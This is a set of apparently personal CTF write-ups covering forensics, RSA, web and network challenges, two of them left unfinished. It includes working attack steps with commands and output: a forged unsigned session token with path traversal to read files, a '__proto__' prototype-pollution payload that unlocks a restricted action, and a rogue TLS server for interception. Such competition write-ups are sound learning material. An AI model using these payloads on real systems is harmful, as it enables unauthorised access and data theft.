
# Chall: PCAP Secret


| Field    | Value      |
| -------- | ---------- |
| Category | Forensics  |
| Date     | 2026-07-18 |

---

## Description

```text
Incident response pulled a tiny packet capture from a suspect jump host—`forensic_pcap_secret.pcap.gg`. 
Most of the traffic looks like routine DNS and HTTP noise, but analysts swear one of these connections is exfiltrating the flag to an external host. 
Download the capture, find the suspicious connection, and recover the hidden flag.
```

---

## Initial Thoughts

A pcap file was provided in the attachment. The file format was **forensic_pcap_secret.pcap.gg** .

I have never heard about this kind of file format before. Ran `file` command and it was a gz archive.
 

---
## Solution

First of all extract the main pcap file from the gunzip archive.

```bash

mv forensic_pcap_secret.pcap.gg forensic_pcap_secret.pcap.gz

gunzip forensic_pcap_secret.pcap.gz

```

Then open the file with wireshark.

![](README-2026-07-18_19-59-39.webp)

We find 2 tcp streams in the pcap file.

![](README-2026-07-18_19-59-32.webp)

![](README-2026-07-18_19-59-23.webp)


Int TCP stream 1, we get a header,

```text
X-Sync-Token: YXRoZW5he3BjNHBfaDFkMzVfMW5fdzFyM30=
```

Decoding this base64 element, we get the flag -> athena{pc4p_h1d35_1n_w1r3}

---
## Flag

```text
athena{pc4p_h1d35_1n_w1r3}
```

---

## Lessons Learned

- Always check all the tcp streams in the wireshark. 
- Overall, a very basic challenge

---


# Chall: Small Root


| Field    | Value   |
| -------- | ------- |
| Category | Crypto  |
| Date     | 2026-07 |

---

## Description

```text

Deep in the Sahar's jungle, a jungle so dense that satellites lose signal between the canopies. A lone owl carries a secret dispatch between two resistance cells. Intercepted mid-flight, the message and the parameters used to seal it are now in your hands.The sender was careless. They chose a method so weak that the night air itself could unravel it. Everything you need is in `pub.txt`.Recover what the owl was carrying. The jungle does not wait.

```

---

## Initial Thoughts

There was a lot of junk data. Tried base64 decoding all blobs and also the hex ones but did not get any real leads. However, some things stood out.

---
## Solution

We get 
```text
epsilon  = ٣ (3 in arabic)

c_main             = e1f809665639ae4384dd4dc31a5aa80bb303deafd4a02fbc69e8f475c26b4702b2f497bb56c8ff6ce9d5b24a7f43b18e8b0d72e652351a254526fa1e290e6a04965
```

So, we get `e = 3` & `c = e1f809665639ae4384dd4dc31a5aa80bb303deafd4a02fbc69e8f475c26b4702b2f497bb56c8ff6ce9d5b24a7f43b18e8b0d72e652351a254526fa1e290e6a04965`

Now, notice that the e is a very low num for a public exponent.

Normally in RSA encryption we do
` C = M^e mod N`

So, `M^e  > N` but here due to small e, `M^e < N` .  
So, basically `C = M^e` .

Now we find the cube root of `C` to get the plaintext or `M` . 

We use the python script : 

```python

from Crypto.Util.number import long_to_bytes
import gmpy2

e = 3

# transfers the hex to a large integer
c = int(
"e1f809665639ae4384dd4dc31a5aa80bb303deafd4a02fbc69e8f475c26b4702b2f497bb56c8ff6ce9d5b24a7f43b18e8b0d72e652351a254526fa1e290e6a04965",
16)

# finds the cuberoot
m, exact = gmpy2.iroot(c, 3)

# exact tells whether the value was a perfect root
print(exact)

#actual plaintext 
print(long_to_bytes(int(m)))

```

prints 
```text
True
b'athena{sm4ll_r00t_r34}'
```

---
## Flag

```text
athena{sm4ll_r00t_r34}
```

---

## Lessons Learned

- Small exponent attack by direct root.
- Upon more research, the challenge makers could have added a random num like this, `c = m^3 + k·n`


---


# Chall: Session-Slip


| Field    | Value      |
| -------- | ---------- |
| Category | Web        |
| Date     | 2026-07-18 |

---

## Description

```text

A small internal dashboard exposes a homegrown session gateway. Find out how its custom session format is built, forge your way in, and see what else it lets you reach.

```

---

## Initial Thoughts

Just a plain api exposed on the web. 
Manually checked /robots.txt and /admin

/admin showed forbidden

---
## Solution

Directory bruteforcing the url at `http://13.206.57.188:10040/FUZZ` ,

Wordlist used: raft-medium.txt

```text

admin                   [Status: 403, Size: 21, Words: 1, Lines: 1, Duration: 38ms]
Admin                   [Status: 403, Size: 21, Words: 1, Lines: 1, Duration: 100ms]
export                  [Status: 403, Size: 21, Words: 1, Lines: 1, Duration: 101ms]
ADMIN                   [Status: 403, Size: 21, Words: 1, Lines: 1, Duration: 109ms]
notes                   [Status: 301, Size: 155, Words: 6, Lines: 11, Duration: 56ms]
Export                  [Status: 403, Size: 21, Words: 1, Lines: 1, Duration: 43ms]

```

When i used this wordlist

```bash
ffuf -u http://13.206.57.188:10033/FUZZ \ 
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc all -fc 404

```

I get hits on 
```text
package.json            [Status: 200, Size: 52, Words: 11, Lines: 6, Duration: 212ms]
package-lock.json       [Status: 200, Size: 30057, Words: 6015, Lines: 859, Duration: 308ms]

```

package.json 
```text
{
  "dependencies": {
    "express": "^5.2.1"
  }
}
```

So, It was evident that this was an node-express app.

I searched for node specific files by an AI generated wordlist and got hit on `server.js` . Let's analyse the js file by writing comments now.


/server.js
```javascript
const crypto = require('crypto');
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();

app.use(express.static(__dirname));

// important leakage
const SESSION_KEY = 'orchid';

const sessionFixtures = require('./sessions.json');
const NOTES_DIR = path.join(__dirname, 'notes');

// custom signing function using a payload
function sign(payload) {
  return crypto.createHmac('sha256', SESSION_KEY).update(payload).digest('hex');
}


function parseSession(rawToken) {
  if (!rawToken) {
    return { role: 'guest' };
  }
	
  // totally bypasses sig check if token starts with 'dbg.'
  if (rawToken.startsWith('dbg.')) {
    const body = Buffer.from(rawToken.slice(4), 'base64').toString('utf8');
    return JSON.parse(body);
  }

  // if not then checks the signature
  const [payload, digest] = rawToken.split('.');
  if (!payload || !digest || sign(payload) !== digest) {
    return { role: 'guest' };
  }

  return JSON.parse(Buffer.from(payload, 'base64').toString('utf8'));
}

app.get('/', (req, res) => {

  // in this endpoint you can check if the token parses correctly or not
  // no real vuln 
  const session = parseSession(req.headers['x-session']);
  res.json({
    banner: 'session gateway',
    user: session.user || 'anonymous',
    role: session.role || 'guest'
  });
});

app.get('/admin', (req, res) => {
  const session = parseSession(req.headers['x-session']);
  if (session.role !== 'admin') {
    return res.status(403).json({ error: 'forbidden' });
  }

  res.json({
    message: 'welcome back',
    note: sessionFixtures.admin_note
  });
});


// severe vuln detected
app.get('/export', (req, res) => {
  const session = parseSession(req.headers['x-session']);
  if (session.role !== 'admin') {
    return res.status(403).json({ error: 'forbidden' });
  }

  // this takes direct input from the url query and finds for that file, which leads to path traversal vuln with query ?file=<filename>
  const name = req.query.file || 'admin.txt';
  const target = path.join(NOTES_DIR, name);

  // reads the given file in the query
  fs.readFile(target, 'utf8', (err, data) => {
    if (err) {
      return res.status(404).json({ error: 'not found' });
    }

    res.json({ file: name, content: data });
  });
});

app.listen(1337);

```


Forged a token: `dbg.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==`

passed it using curl request: 

```bash

curl http://13.206.57.188:10023/admin -H 'X-Session: dbg.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ=='


{"message":"welcome back","note":"Ops memo archived under notes/ for staff review."} 

```

Hence, we bypassed the auth and was able to access the /admin endpoint and read the admin_note.

The note is probably a decoy because we don't see a /notes endpoint in the server.js

Then we check the /export endpoint using the same authentication system.

```bash
curl http://13.206.57.188:10023/export -H 'X-Session: dbg.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ=='


{"file":"admin.txt","content":"Ops memo: rotate the session signing key next sprint and finish hardening the staging gateway before launch. - ops team\r\n"}
```

For the path traversal vuln in /export endpoint we fuzz with it a bit and finally find the flag at ../../flag.txt.

sessions.json file
```bash

curl http://13.206.57.188:10023/export?file=../sessions.json -H 'X-Session: dbg.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ==' 


{"file":"../sessions.json","content":"{\r\n  \"users\": [\r\n    {\r\n      \"user\": \"guest\",\r\n      \"role\": \"guest\"\r\n    },\r\n    {\r\n      \"user\": \"operator\",\r\n      \"role\": \"user\"\r\n    },\r\n    {\r\n      \"user\": \"admin\",\r\n      \"role\": \"admin\"\r\n    }\r\n  ],\r\n  \"admin_note\": \"Ops memo archived under notes/ for staff review.\"\r\n}\r\n"}

---- formatted :
{ "users": [ { "user": "guest", "role": "guest" }, { "user": "operator", "role": "user" }, { "user": "admin", "role": "admin" } ], "admin_note": "Ops memo archived under notes/ for staff review." }

```

flag.txt file
```bash

curl http://13.206.57.188:10023/export?file=../../flag.txt -H 'X-Session: dbg.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ=='


{"file":"../../flag.txt","content":"athena{bSgXjywG7CN9hfAa}"}

```


---
## Flag

```
athena{bSgXjywG7CN9hfAa}
```

---

## Lessons Learned

- how the server looks when there is a path traversal vulnerability

---


# Chall: NET MITM TLS


| Field    | Value      |
| -------- | ---------- |
| Category | INFRA      |
| Date     | 2026-07-18 |

---

## Description

```text

A background service in the target environment periodically transmits a secret flag over TLS to https://net-mitm.local:4443/submit. Connect to the shell service, set up a rogue TLS server with a forged certificate matching the expected domain hostname, and intercept the secret.
```

---

## Initial Thoughts

From the description of this challenge, it is pretty obvious about the next steps.

We have to setup a server which will be posing as the net-mitm.local and intercept the flag that it is sending to the actual server.

---
## Solution

### Creating the TLS Server

For the server, we need 2 things, 

key.pem (private key)
cert.pem (public key)

Generating the private key

```bash

openssl genrsa -out key.pem 2048
```

This generated a key.pem

Creating the certificate: 

```bash

openssl req -new -x509 -key key.pem -out cert.pem -days 365
```

This basically creates a self-signed certificate using our private key.

You can inspect the certificate with 

```bash
openssl x509 -in cert.pem -text -noout
```

Okay, So we have a **forged certificate** now.


Now, let's create the server with python.

```python

from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class Handler(BaseHTTPRequestHandler):
	
	# listens for any post request
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)

        print("=" * 50)
        print(f"Method : {self.command}")
        print(f"Path   : {self.path}")
        print("Headers:")
        print(self.headers)
        print("Body:")
        print(body.decode(errors="ignore"))
        print("=" * 50)

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

server = HTTPServer(("0.0.0.0", 4443), Handler)

# loads the certificate
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("cert.pem", "key.pem")

server.socket = ctx.wrap_socket(
    server.socket,
    server_side=True
)

print("Listening on https://0.0.0.0:4443")
server.serve_forever()

```

we import the files onto the remote server and run the file in the /player home directory and it captures the request and gives us the flag. 
Make sure to have your key.pem and cert.pem in there too.

After running the server.py

![](README-2026-07-18_23-54-49.webp)

---
## Flag

```text
athena{ZX2PlVO2gkFTJUFF}
```

---

## Lessons Learned

- How to create a tls server from scratch
- how certificates are created
- openssl usage in making certifcates

---


# Chall: Net Custom Protocol


| Field    | Value      |
| -------- | ---------- |
| Category | Infra      |
| Date     | 2026-07-19 |

---

## Description

```text

Reverse the custom echo protocol(ECHO|k|foo) over tcp and find a way to leak the secret. A player-facing transcript is provided; the service and secret are organizer-only.

```

---

## Initial Thoughts

It is some kind of command injection but within a strict format of `cmd | len | argument` 


---
## Solution

Connecting to the TCP server and just playing with it to find how it behaves 

![](README-2026-07-19_00-11-06.webp)


We see that, when echo command is ran, it reads the first k len bytes from the argument.

Now, let's check for other commands
![](README-2026-07-19_00-14-32.webp)

Other errors

![](README-2026-07-19_00-14-49.webp)

Extending the length of the echo a bit more we get the flag. 

![](README-2026-07-19_00-28-59.webp)

So, basically it was already there with every command, we just had to increase the length to see it.

---
## Flag

```
athena{vlmMwEcC7hQWfge2}
```

---

## Lessons Learned

- Just a misc chall

---


# Chall: Mailroom Echo


| Field    | Value       |
| -------- | ---------- |
| Category Forensics  s  |
| Date     | 2026-07     |

---

## Description

```text

Internal Affairs flagged a helpdesk analyst for quietly routing data out of the building inside dull-looking quarterly summary notes. Before the account could be locked, the support mailbox was quarantined and a single message from the reply thread was exported for review.The body reads like ordinary desk chatter and steers you away from anything useful -- but this is a mail message, and the interesting part rarely rides in the body

```

---

## Initial Thoughts

Just opened the mail in notepad and got a base64 blob which on decoding gave the flag. 

---
## Solution

mail

```text

From: helpdesk@example.local
To: analyst@example.local
Subject: Re: quarantined mailbox export
Date: Tue, 20 May 2026 09:14:12 +0000
Message-ID: <20260520091412.4f1a@example.local>
In-Reply-To: <20260519163355.8c02@example.local>
References: <20260519154120.1b77@example.local>
	<20260519163355.8c02@example.local>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="boundary-9f3c"

--boundary-9f3c
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

The original thread was pulled from the support archive.
Nothing useful is visible in the body, so check the attached note.

--boundary-9f3c
Content-Type: text/plain; charset="utf-8"; name="quarterly_summary.txt"
Content-Disposition: attachment; filename="quarterly_summary.txt"
Content-Transfer-Encoding: base64

UXVhcnRlcmx5IHJlY29uY2lsaWF0aW9uIGNvbXBsZXRlLgpCYWNrdXAgbWFya2VyOiBhdGhlbmF7bWltZV90aHJlYWRzX3JldmVhbF90aGVfdHJ1dGh9CkRvIG5vdCBmb3J3YXJkLgo=
--boundary-9f3c--

```

b64 blob: UXVhcnRlcmx5IHJlY29uY2lsaWF0aW9uIGNvbXBsZXRlLgpCYWNrdXAgbWFya2VyOiBhdGhlbmF7bWltZV90aHJlYWRzX3JldmVhbF90aGVfdHJ1dGh9CkRvIG5vdCBmb3J3YXJkLgo=

Decodes to:
Quarterly reconciliation complete.
Backup marker: athena{mime_threads_reveal_the_truth}
Do not forward.


---
## Flag

```text
athena{mime_threads_reveal_the_truth}
```

---


# Chall: Cache Footprint


| Field    | Value      |
| -------- | ---------- |
| Category | Forensics  |
| Date     | 2026-07-19 |

---

## Description

```text

A browser cache was carved from a kiosk image after an incident. The exported SQLite database contains browsing history, downloads, cookies, form data, and session storage. The operator cleaned up after themselves, so the download that matters is no longer in the downloads table — but a delete is not an erase. Recover the missing record, work out how its payload was exported, and decode it to recover the flag. The data URIs still sitting in the database are not the answer.

```

---

## Initial Thoughts

Loaded the database onto a database viewer and inspected the database thoroughly. Saw some decoy base64 blobs.

---
## Solution

Run strings on the sqlite browser for base64 blobs using the command 
```bash
strings browser_history.sqlite | grep base64
```

Found: some of those decoy blobs and a new unique b64 blob: `Ch0HFgVMS0dAVQIdCiwASEBAbk0DDDAQB1hVSQ==`

![](README-2026-07-19_05-36-36.webp)

This looks like b64 but decodes to gibberish at first. 

Also another hint about encryption I found while inspecting the database: 
![](README-2026-07-19_05-38-27.webp)

I used xor decryption using the device-id: kiosk-0419 and it gave the flag.

![](README-2026-07-19_05-38-33.webp)

![](README-2026-07-19_05-40-22.webp)


---
## Flag

```text
athena{sqlite_kept_the_clue}
```

---

# Chall: Meridian Ladder


| Field    | Value      |
| -------- | ---------- |
| Category | Web        |
| Date     | 2026-07-19 |

---

## Description

```text

**Meridian Ladder** is an automated fixed-income "bond ladder" robo-advisor. Customers open an account and the platform builds them a ladder of instruments that mature on a staggered schedule. Depending on the ladder's policy, a customer can also *unwind* a ladder early to free up capital. A staging build is live:

```

---

## Initial Recon

app.js

```js
"use strict";
(() => {
  function e(n) {
    return btoa(JSON.stringify({ t: "ladder", n }))
      .replace(/\+/g, "-")
      .replace(/\//g, "_")
      .replace(/=+$/, "");
  }
  async function t(n, r, o) {
    const s = {
      method: n,
      headers: { "content-type": "application/json" },
      credentials: "same-origin",
    };
    o && (s.body = JSON.stringify(o));
    const c = await fetch(r, s);
    return c.json();
  }
  async function a() {
    return t("GET", "/api/portfolio");
  }
  async function i(n) {
    return t("GET", "/api/ladder/" + n);
  }
  async function d(n) {
    return t("PATCH", "/api/preferences", n);
  }
  async function u(n) {
    return t("POST", "/api/ladder/" + n + "/unwind");
  }

  window.Meridian = {

    encodeLadderId: e,

    portfolio: a,

    ladder: i,

    savePrefs: d,

		    unwind: u,

  };

  console.log("[meridian] client ready");

})();

//# sourceMappingURL=app.js.map
```

app.js.map

```js
{
  "version": 3,
  "file": "app.js",
  "sourceRoot": "",
  "sources": [
    "src/api.ts",
    "src/preferences.ts",
    "src/unwind.ts",
    "src/main.ts"
  ],
  "names": [],
  "mappings": "AAAA",
  "sourcesContent": [
    "// src/api.ts\n// Ladder ids are opaque tokens: a base64url-wrapped descriptor. The backend\n// decodes them the same way, so the client just mirrors the encoder.\nexport function encodeLadderId(n: number): string {\n  const descriptor = { t: 'ladder', n };\n  return base64url(JSON.stringify(descriptor));\n}\n\nexport function decodeLadderId(token: string): number | null {\n  const { t, n } = JSON.parse(fromBase64url(token));\n  return t === 'ladder' ? n : null;\n}\n\nexport async function api(method: string, url: string, body?: unknown) {\n  const init: RequestInit = { method, headers: { 'content-type': 'application/json' }, credentials: 'same-origin' };\n  if (body) init.body = JSON.stringify(body);\n  return (await fetch(url, init)).json();\n}\n",
    "// src/preferences.ts\nimport { api } from './api';\n\n// Preferences are a nested document (display, notifications, unwind overrides).\n// The client sends a partial patch; the server deep-merges it into the stored\n// settings so a single leaf can be updated without resending the whole tree.\n// Example partial: { display: { theme: 'dark' } }\nexport async function savePreferences(patch: object) {\n  return api('PATCH', '/api/preferences', patch);\n}\n",
    "// src/unwind.ts\nimport { api } from './api';\n\n// The 'Unwind' button is enabled only when the ladder is unwind-eligible.\n// Eligibility mirrors the server: the effective policy is the ladder's own\n// policy overlaid with the customer's saved unwind overrides —\n//   const opts = { ...ladder.policy, ...settings.unwind };\n// A ladder is eligible when it is not frozen and opts.allowEarlyUnwind === true.\n//\n// NOTE(platform): reserve/treasury ladders intentionally omit allowEarlyUnwind\n// from their policy, so they can never be eligible from the UI. Do not add a\n// client-side override for them.\nexport async function unwind(id: string) {\n  return api('POST', `/api/ladder/${id}/unwind`);\n}\n",
    "// src/main.ts\nimport { encodeLadderId, portfolio, ladder } from './api';\nimport { savePreferences } from './preferences';\nimport { unwind } from './unwind';\n\n(window as any).Meridian = { encodeLadderId, portfolio, ladder, savePrefs: savePreferences, unwind };\nconsole.log('[meridian] client ready');\n"
  ]
}

```


 Highlight: // The client sends a partial patch; the server deep-merges it into the stored

So, this hints at prototype pollution,

```bash

└─$ curl -X PATCH http://13.206.57.188:10012/api/preferences -H 'Cookie: sid=c0cda367a5b7b9227bb743b775694408' -d '{                                     
  "__proto__": {
    "allowEarlyUnwind": true
  }
}' -H 'Content-Type: application/json'
{"ok":true,"settings":{"display":{"currency":"USD","theme":"light"},"notifications":{"maturityAlerts":true},"unwind":{"allowEarlyUnwind":true}}}    

```

Then, at the user-id 1 ladder you will see that the unwindEligibile is true. So, now hit the unwind endpoint.

```json
{
"unwindEligible": true
}

```


```bash

└─$ curl http://13.206.57.188:10012/api/ladder/eyJ0IjoibGFkZGVyIiwibiI6MX0=/unwind -H 'Cookie: sid=c0cda367a5b7b9227bb743b775694408' -X POST
{"ok":true,"reconciliation":{"ladder":"House Reserve Ladder","tier":"reserve","rungsLiquidated":4,"penaltyBps":0,"settlementToken":"athena{nH4oIdStjC3F9Bbs}","note":"reserve ladder unwound — settlement reconciliation complete"}}     

```

---
## Solution

Thought that i found a idor by unwinding other ladders but its already given in the interface. 

Flag -> athena{nH4oIdStjC3F9Bbs}

---
## Flag

```text
athena{nH4oIdStjC3F9Bbs}
```

---

## Lessons Learned

- Prototype pollution

---


# Not Completed ------------
# Chall: Query Mirage


| Field    | Value      |
| -------- | ---------- |
| Category | Infra      |
| Date     | 2026-07-19 |

---

## Description

```text

A staging notes portal was left open. Find the SQL injection point on the search endpoint, bypass the filters, enumerate the database schema, and extract the private record.

```

---

## Initial Recon

Another api endpoint.

fuzz it.




---
## Solution

Explain the intended vulnerability.

---
## Flag

```
flag{}
```

---

## Lessons Learned

- New techniques
- Mistakes
- Tools discovered

---

## References

- https://...
- https://...


# Chall: USBStorage Residue


| Field    | Value      |
| -------- | ---------- |
| Category | Forensics  |
| Date     | 2026-07-19 |

---

## Description

```text

A USB mass-storage session was captured while a private file was written to a removable drive, replaced with a newer copy, and then removed. The drive is gone; the capture is all that survived. The frames use a link type no dissector will touch, so you are on your own with the bytes. Reconstruct the drive's contents from the write traffic and recover the deleted file.

```

---

## Initial Thoughts

Opened the file in wireshark and inspected the packets of varying lengths, some seem to be repeating packets.

---
## Solution



---
## Flag

```

```

---

## Lessons Learned

- New techniques
- Mistakes
- Tools discovered

---

## References

- https://...
- https://...





